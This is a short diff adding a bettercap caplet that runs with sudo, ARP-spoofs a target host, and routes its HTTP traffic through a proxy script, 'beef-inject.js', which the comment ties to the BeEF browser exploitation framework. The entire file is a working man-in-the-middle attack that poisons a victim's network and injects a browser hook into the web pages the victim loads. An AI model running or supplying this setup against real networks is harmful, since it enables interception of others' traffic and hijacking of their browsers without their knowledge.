@@ -1,0 +1,8 @@
+sudo bettercap -caplet beef-active.cap -eval "set arp.spoof.targets $host"
+
+# BeEf the browser exploitation framework project
+set http.proxy.script beef-inject.js
+http.proxy on
+sleep 1
+arp.spoof on
+
